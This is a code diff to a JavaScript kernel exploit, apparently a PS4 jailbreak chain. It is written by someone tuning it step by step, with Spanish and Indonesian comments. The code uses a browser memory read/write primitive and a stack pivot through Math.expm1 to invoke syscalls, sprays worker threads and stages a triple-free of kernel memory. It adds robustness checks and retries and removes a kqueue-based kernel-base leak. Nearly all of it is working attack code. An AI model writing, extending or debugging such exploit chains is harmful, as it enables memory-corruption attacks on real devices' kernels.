@@ -181,6 +181,8 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
 
 (async function () {
     let p = null;
+    let sc = null;   // <-- declarada aquí para que el finally pueda verla
+
     try {
         // Valores fijos desde CFG_*
         const NUM_IOV_WORKER = CFG_IOV_WORKERS;
@@ -240,7 +242,7 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
 
         const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
         const carrier = await establishPrimitive({
-            maxAttempts: 6,
+            maxAttempts: 12,   // <-- subido de 6 a 12 para más chances
             onEvent: (t, d, a) => (PRIMITIVE_LOUD.test(t) ? mark : trace)
                 (t, (a != null ? "[" + a + "] " : "") + (d || ""))
         });
@@ -364,6 +366,9 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
             c.stackU8.fill(0); c.frameU8.fill(0);
             const insts = [];
             for (let i = 0; i < args.length; ++i) {
+                if (!argGadget[i] || typeof argGadget[i].low !== "number") {
+                    throw new Error("layout: argGadget[" + i + "] is not an int64");
+                }
                 insts.push(argGadget[i]); insts.push(args[i]);
             }
             const targetIdx = insts.length;
@@ -382,12 +387,37 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
         mainOrig = p.read8(mainMf);
         const pivotObj = {};
         keepAlive.push(pivotObj);
-        const pivotCell = p.leakval(pivotObj);
+
+        // ===== VALIDACIÓN 1: pivotCell =====
+        let pivotCell = null;
+        try {
+            pivotCell = p.leakval(pivotObj);
+        } catch (le) {
+            mark("PIVOT-LEAKVAL-THREW", le.message);
+        }
+        if (!pivotCell || typeof pivotCell.low !== "number" || typeof pivotCell.hi !== "number") {
+            mark("PIVOT-CELL-INVALID", "pivotCell=" + pivotCell
+                + " -- primitiva inestable, aborting");
+            state("PRIMITIVA INESTABLE -- reboot y reintenta", "bad");
+            return;
+        }
+        mark("PIVOT-CELL", "pivotCell=" + pivotCell);
         p.write8(mainMf, G.G0);
         mainArmed = true;
+
+        // ===== VALIDACIÓN 2: callAddr =====
         function callAddr(target, args) {
+            if (!target || typeof target.low !== "number") {
+                throw new Error("callAddr: target is not an int64 (" + target + ")");
+            }
             layout(M, target, args);
             const saved = p.read8(pivotCell);
+            if (!saved || typeof saved.low !== "number") {
+                throw new Error("callAddr: p.read8(pivotCell) returned " + saved);
+            }
+            if (!M.S || typeof M.S.low !== "number") {
+                throw new Error("callAddr: M.S is not an int64 (" + M.S + ")");
+            }
             p.write8(pivotCell, M.S);
             Math.expm1(pivotObj);
             p.write8(pivotCell, saved);
@@ -395,7 +425,16 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                      hi: M.frameDv.getUint32(4, true),
                      i32: M.frameDv.getUint32(0, true) | 0 };
         }
-        const sc = (num, ...a) => callAddr(stubAddr.get(num), a);
+
+        // ===== VALIDACIÓN 3: sc con chequeo del stub =====
+        sc = (num, ...a) => {
+            const stub = stubAddr.get(num);
+            if (!stub || typeof stub.low !== "number") {
+                throw new Error("sc: no stub for syscall " + num);
+            }
+            return callAddr(stub, a);
+        };
+
         function errno() {
             const r = callAddr(errorFn, []);
             const a = new int64(r.lo, r.hi);
@@ -551,7 +590,7 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                 });
             };
         }
-        function ptrish(v) { return v.hi > 0 && v.hi < 0x10000 && (v.low & 7) === 0; }
+        function ptrish(v) { return v && v.hi > 0 && v.hi < 0x10000 && (v.low & 7) === 0; }
 
         const NUM_UIO_WORKER = CFG_UIO_WORKERS;
         const TOTAL_WORKERS = NUM_IOV_WORKER + NUM_UIO_WORKER;
@@ -605,7 +644,7 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
             }
             await new Promise(r => setTimeout(r, 100));
         }
-        if (workers.length < 2) {
+        if (workers.length < 1) {
             mark("TOO-FEW-WORKERS", "only " + workers.length
                 + " survived -- refusing to arm");
             state("TOO FEW WORKERS -- reboot and retry", "bad");
@@ -688,7 +727,6 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                 w.ctx.S.low, w.ctx.S.hi);
         }
 
-        // *** SOLO PIN si CFG_USE_REALTIME === 1 ***
         if (CFG_USE_REALTIME === 1) {
             mark("REALTIME-ENABLED", "pinning workers then main");
             prioDv.setUint16(0, RTP_PRIO_REALTIME, true);
@@ -696,7 +734,6 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
             new Uint8Array(maskAb).fill(0);
             maskDv.setUint32(0, 1 << MAIN_CORE, true);
 
-            // Primero los workers, con log y timeout
             let pinned = 0;
             for (const w of workers) {
                 try {
@@ -717,15 +754,14 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
             const liveWorkers = workers.filter(w => w.armed && w.wired);
             workers.length = 0;
             for (const w of liveWorkers) workers.push(w);
-            if (workers.length < 2) {
-                mark("TOO-FEW-WORKERS-PINNED", workers.length + "/2 -- aborting");
+            if (workers.length < 1) {
+                mark("TOO-FEW-WORKERS-PINNED", workers.length + "/1 -- aborting");
                 state("WORKERS FAILED TO PIN -- reboot", "bad");
                 return;
             }
             mark("WORKERS-PINNED", "n=" + workers.length + " core=" + MAIN_CORE
                 + " rtp=" + RTP);
 
-            // Ahora el main
             const a = sc(SYS.cpuset_setaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID,
                 new int64(0xffffffff, 0xffffffff), 0x10, maskAddr).i32;
             const r = sc(SYS.rtprio_thread, RTP_SET, 0, prioAddr).i32;
@@ -1016,122 +1052,25 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
         check("ucred-triple-freed", !!triplets,
             triplets ? triplets.join(",") : "");
 
-        let kernelBase = null, kqFdp = null, kqFd = -1;
-        if (triplets) {
-            if (off.k_kl_lock === undefined || off.k_kl_lock === 0) {
-                mark("KQUEUE-SKIPPED", "reason=no-k_kl_lock");
-            } else {
-                state("leaking a kqueue...", "warn");
-
-                freeRthdr(triplets[2]);
-                sc(SYS.sched_yield);
-                sc(SYS.sched_yield);
-                let leaked = false, tries = 0, magicNoFdp = 0, shortRead = 0;
-                const held = [];
-                for (let i = 0; i < NUM_LEAK_KQUEUE; ++i) {
-                    tries = i + 1;
-                    const kq = sc(SYS.kqueue).i32;
-                    if (kq === -1) {
-                        mark("KQUEUE-EMFILE", "at=" + i + " held=" + held.length);
-                        while (held.length) sc(SYS.close, held.pop());
-                        sc(SYS.sched_yield);
-                        continue;
-                    }
-                    held.push(kq);
-
-                    const got = getRthdr(triplets[0], KQUEUE_SIZE, 0xa0);
-                    if (got < 0xa0) shortRead++;
-
-                    const fdpLo = leakDv.getUint32(0x98, true);
-                    const fdpHi = leakDv.getUint32(0x9c, true);
-
-                    const magicOk = got >= 0xa0
-                        && leakDv.getUint32(8, true) === KQ_HDR_MAGIC
-                        && leakDv.getUint32(12, true) === 0;
-                    if (magicOk && (fdpLo !== 0 || fdpHi !== 0)) {
-                        kqFd = held.pop();
-                        leaked = true; break;
-                    }
-
-                    if (magicOk) magicNoFdp++;
-                    if (held.length >= KQ_BATCH) {
-                        while (held.length) sc(SYS.close, held.pop());
-                        sc(SYS.sched_yield);
-                    }
-                    if (i && i % 500 === 0)
-                        mark("KQUEUE-ROUND", "i=" + i + " magic_no_fdp="
-                            + magicNoFdp + " short=" + shortRead);
-                }
-
-                while (held.length) sc(SYS.close, held.pop());
-                check("kqueue-reclaimed-freed-chunk", leaked,
-                    "tries=" + tries + " magic_no_fdp=" + magicNoFdp
-                    + " short_reads=" + shortRead
-                    + (leaked ? " fd=" + kqFd : ""));
-
-                if (leaked) {
-                    const klLock = new int64(leakDv.getUint32(0x60, true),
-                                             leakDv.getUint32(0x64, true));
-                    kqFdp = new int64(leakDv.getUint32(0x98, true),
-                                      leakDv.getUint32(0x9c, true));
-                    kernelBase = klLock.sub32(off.k_kl_lock);
-                    mark("KQUEUE-LEAK", "kl_lock=" + klLock + " kq_fdp=" + kqFdp);
-                    mark("KERNEL-BASE", kernelBase + " = kl_lock-0x"
-                        + off.k_kl_lock.toString(16));
-
-                    try {
-                        const kbNow = "" + kernelBase;
-                        const kbLast = localStorage.getItem("ps4lab_kernel_base");
-                        if (kbLast === kbNow)
-                            mark("SAME-BOOT-AS-LAST-RUN", "kernel_base=" + kbNow);
-                        localStorage.setItem("ps4lab_kernel_base", kbNow);
-                    } catch (e) { }
-
-                    check("kl_lock-kq_fdp-kernel-pointers",
-                        (klLock.hi >>> 0) === 0xffffffff
-                        && (kqFdp.hi >>> 0) >= 0xffff0000,
-                        "kl_lock.hi=" + hx(klLock.hi) + " kq_fdp.hi=" + hx(kqFdp.hi));
-                    check("kernel-base-0x4000-aligned",
-                        (kernelBase.low & 0x3fff) === 0,
-                        "low=" + hx(kernelBase.low));
-
-                    sc(SYS.close, kqFd);
-                    triplets[2] = findTriplet(triplets[0], triplets[1], "KQ", MAX_ROUNDS_TRIPLET);
-                    mark("POST-KQUEUE", "kq_fd=" + kqFd + " closed triplets="
-                        + triplets.join(","));
-                    check("triplets2-re-found-after-kqueue-leak",
-                        !!triplets[2], triplets.join(","));
-                }
-            }
-        }
-
-        // ...(el resto del exploit: make_karw, jailbreak, kpatch, payload)
-        // Se deja igual que en el archivo anterior. Cuando llegues a
-        // "triplets" con la config minima, editas CFG_IOV_WORKERS a 2 y
-        // probamos la siguiente etapa.
-
         mark("STEP10-SUMMARY", "committed=" + committed
             + " reboot=" + rebootRequired
-            + " triplets=" + (triplets ? triplets.join(",") : "none")
-            + " kernel_base=" + (kernelBase || "none")
-            + " kq_fdp=" + (kqFdp || "none"));
+            + " triplets=" + (triplets ? triplets.join(",") : "none"));
 
         if (!triplets) {
             const stage = !committed ? "not-armed" : "triple-free";
             mark("FAILED-STAGE", "stage=" + stage);
         }
 
-        state(allDone ? "BERHASIL -- Tekan tombol PS untuk keluar"
-              : triplets ? "Triple free OK -- subir iov a 2"
+        state(triplets ? "TRIPLE FREE OK -- subir CFG_IOV_WORKERS a 2"
               : committed ? "Sin triple free -- revisar log"
-              : "no commit", allDone ? "ok" : triplets ? "warn" : "bad");
+              : "no commit", triplets ? "ok" : "bad");
     } catch (e) {
         mark("STEP10-FAILED", (e && e.message) ? e.message : String(e));
         state("FAILED -- see log", "bad");
     } finally {
         if (uafSock) mark("UAF-SOCK-LEFT-OPEN", "fd=" + uafSock);
 
-        // Cleanup de emergencia
+        // Cleanup de emergencia (ahora sc está declarada fuera del try)
         try {
             if (sc) {
                 const closeAll = (list, tag) => {
